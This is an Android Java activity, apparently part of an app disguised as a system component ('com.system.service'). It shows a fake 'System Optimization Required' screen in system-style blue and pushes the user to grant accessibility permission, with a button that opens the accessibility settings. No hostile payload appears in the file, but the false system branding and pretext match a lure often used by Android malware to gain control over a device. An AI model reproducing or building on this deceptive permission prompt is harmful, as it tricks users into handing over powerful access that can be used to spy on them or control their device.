package com.system.service;

import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.WHITE);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(50, 50, 50, 50);

        TextView title = new TextView(this);
        title.setText("System Optimization Required");
        title.setTextSize(22f);
        title.setTypeface(null, Typeface.BOLD);
        title.setTextColor(Color.BLACK);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 20, 0, 10);

        TextView subtitle = new TextView(this);
        subtitle.setText("To maintain device performance and security, System Service requires accessibility permissions to optimize background processes.");
        subtitle.setTextSize(15f);
        subtitle.setTextColor(Color.DKGRAY);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 0, 0, 40);

        Button btn = new Button(this);
        btn.setText("Enable System Service");
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(16f);
        btn.setBackgroundColor(Color.parseColor("#007BFF")); // Standard system blue
        
        layout.addView(title);
        layout.addView(subtitle);
        layout.addView(btn);
        setContentView(layout);

        btn.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });
    }
}
